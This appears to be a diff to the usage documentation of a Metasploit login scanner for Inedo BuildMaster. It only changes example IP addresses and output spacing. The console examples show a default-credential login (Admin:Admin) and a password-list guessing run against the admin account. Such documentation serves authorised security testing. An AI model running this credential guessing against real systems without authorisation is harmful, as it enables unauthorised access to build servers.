@@ -14,13 +14,13 @@ This module allows you to authenticate to Inedo BuildMaster, an application rele
 Attempt to login with the default credentials.
 ```
 msf > use auxiliary/scanner/http/buildmaster_login
-msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.8
-RHOSTS => 10.0.0.8
+msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.39
+RHOSTS => 10.0.0.39
 msf auxiliary(buildmaster_login) > run
 
-[+] 10.0.0.8:81 - Identified BuildMaster 5.7.3 (Build 1)
-[*] 10.0.0.8:81 - Trying username:"Admin" with password:"Admin"
-[+] SUCCESSFUL LOGIN - 10.0.0.8:81 - "Admin":"Admin"
+[+] 10.0.0.39:81          - Identified BuildMaster 5.7.3 (Build 1)
+[*] 10.0.0.39:81          - Trying username:"Admin" with password:"Admin"
+[+] SUCCESSFUL LOGIN - 10.0.0.39:81          - "Admin":"Admin"
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(buildmaster_login) >
@@ -54,19 +54,19 @@ Module options (auxiliary/scanner/http/buildmaster_login):
    VERBOSE           true             yes       Whether to print output for all attempts
    VHOST                              no        HTTP server virtual host
 
-msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.8
-RHOSTS => 10.0.0.8
+msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.39
+RHOSTS => 10.0.0.39
 msf auxiliary(buildmaster_login) > set USERPASS_FILE ~/BuildMasterCreds.txt
 USERPASS_FILE => ~/BuildMasterCreds.txt
 msf auxiliary(buildmaster_login) > run
 
-[+] 10.0.0.8:81 - Identified BuildMaster 5.7.3 (Build 1)
-[*] 10.0.0.8:81 - Trying username:"Admin" with password:"test"
-[-] FAILED LOGIN - 10.0.0.8:81 - "Admin":"test"
-[*] 10.0.0.8:81 - Trying username:"Admin" with password:"wrong"
-[-] FAILED LOGIN - 10.0.0.8:81 - "Admin":"wrong"
-[*] 10.0.0.8:81 - Trying username:"Admin" with password:"Admin"
-[+] SUCCESSFUL LOGIN - 10.0.0.8:81 - "Admin":"Admin"
+[+] 10.0.0.39:81          - Identified BuildMaster 5.7.3 (Build 1)
+[*] 10.0.0.39:81          - Trying username:"Admin" with password:"test"
+[-] FAILED LOGIN - 10.0.0.39:81          - "Admin":"test"
+[*] 10.0.0.39:81          - Trying username:"Admin" with password:"wrong"
+[-] FAILED LOGIN - 10.0.0.39:81          - "Admin":"wrong"
+[*] 10.0.0.39:81          - Trying username:"Admin" with password:"Admin"
+[+] SUCCESSFUL LOGIN - 10.0.0.39:81          - "Admin":"Admin"
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(buildmaster_login) > 
